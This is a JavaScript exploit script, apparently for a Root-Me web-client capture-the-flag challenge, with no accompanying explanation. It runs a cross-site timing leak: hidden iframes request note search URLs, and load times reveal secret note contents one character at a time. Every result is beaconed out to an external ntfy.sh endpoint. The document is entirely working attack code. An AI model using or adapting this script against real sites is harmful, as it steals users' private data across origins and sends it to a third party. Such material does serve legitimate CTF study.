const B='https://web-client-ch56.challenge01.root-me.org:58056/';
const N='https://ntfy.sh/wcxleak56a';
const T0=Date.now(),LIMIT=150000,EL=()=>Date.now()-T0;
const log=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
const logj=o=>log(JSON.stringify(Object.assign({t:Math.round(EL()/100)/10},o)));
onerror=(m,s,l)=>{logj({jserr:''+m+' L'+l})};
onunhandledrejection=e=>{logj({rej:''+e.reason})};
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_';
let rid=0;
function probe1(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
 const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
 f.style.cssText='display:none';
 f.onload=()=>done(Date.now()-st);f.onerror=()=>done(9999);setTimeout(()=>done(9998),12000);
 f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+(rid++);
 document.body.appendChild(f);});}
async function probe(id,q){const a=await probe1(id,q);if(a<1500||a>5000)return a;const b=await probe1(id,q);return b;}
async function wave(ids,p){
 const out={},dbg={};
 await Promise.all(ids.map(async id=>{
  const r=await Promise.all(CHARS.split('').map(async c=>[c,await probe(id,p+c)]));
  const s=r.slice().sort((x,y)=>x[1]-y[1]);
  out[id]=r.filter(x=>x[1]>1400&&x[1]<5000).map(x=>x[0]);
  dbg['d'+id]=s[0][1]+'/'+s[19][1]+'/'+s[37][1];
 }));
 return{out,dbg};
}
(async()=>{
 logj({ev:'start',ua:navigator.userAgent});
 let hbi=0;setInterval(()=>logj({ev:'hb',i:hbi++}),15000);
 const ranges=[[1,24],[25,64],[65,144]];
 let frontier=[],seen={},batch={},bc=0;
 outer:for(const[a,b]of ranges){
  const ids=[];for(let i=a;i<=b;i++)ids.push(i);
  for(const id of ids){
   if(EL()>LIMIT)break outer;
   const{out,dbg}=await wave([id],'');
   const h=out[id];
   batch[id]=h.join('')||'-';batch['d'+id]=dbg['d'+id];
   if(h.length)for(const c of h)frontier.push([id,c]);
   if(++bc>=4){logj({r1:batch});batch={};bc=0;}
   if(frontier.length)break outer;
  }
 }
 if(Object.keys(batch).length)logj({r1:batch});
 logj({ev:'r1done',n:frontier.length});
 for(let d=0;d<45&&frontier.length;d++){
  const nf=[],exts={},ends=[];
  for(const[id,p]of frontier){
   const k=id+'|'+p;if(seen[k])continue;seen[k]=1;
   if(EL()>LIMIT){logj({cut:id+'~'+p});continue;}
   const{out}=await wave([id],p);
   const h=out[id];
   exts[id+'~'+p]=h.join('');
   if(!h.length)ends.push(id+'~'+p);
   for(const c of h)nf.push([id,p+c]);
  }
  frontier=nf;if(frontier.length>30)frontier=frontier.slice(0,30);
  logj({lvl:d,exts:exts,ends:ends});
 }
 logj({ev:'done'});
})();
